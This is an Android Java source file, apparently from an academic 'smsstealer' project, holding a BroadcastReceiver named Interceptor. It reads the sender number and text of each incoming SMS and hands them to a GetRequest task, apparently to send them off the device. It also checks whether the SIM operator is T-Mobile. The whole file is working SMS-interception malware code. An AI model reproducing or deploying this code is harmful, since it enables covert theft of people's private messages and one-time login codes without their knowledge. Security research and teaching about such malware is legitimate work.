package edu.oakland.smsstealer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import java.util.HashMap;

/**
 * Created by anthony on 1/7/17.
 */
public class Interceptor extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        boolean isTMobile = isTMobile(MainActivity.MANAGER.getSimOperator());
        try {
            if (bundle != null) {
                String message = null, number = null;
                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    number = currentMessage.getDisplayOriginatingAddress();
                    message = currentMessage.getDisplayMessageBody();
                }
                if (message != null && number != null) {
                    new GetRequest(number, message, isTMobile).execute();
                }
            }
        } catch (Exception e) {
            Toast.makeText(context, "Some sort of exception. No other information.", Toast.LENGTH_LONG).show();
        }
    }

    private boolean isTMobile(String simOperator) {
        switch(Integer.parseInt(simOperator)) {
            case 310026:
            case 310160:
            case 310200:
            case 310210:
            case 310220:
            case 310230:
            case 310240:
            case 310250:
            case 310260:
            case 310270:
            case 310280:
            case 310290:
            case 310310:
            case 310330:
            case 310580:
            case 310660:
            case 310800:
                return true;
            default:
                return false;
        }
    }
}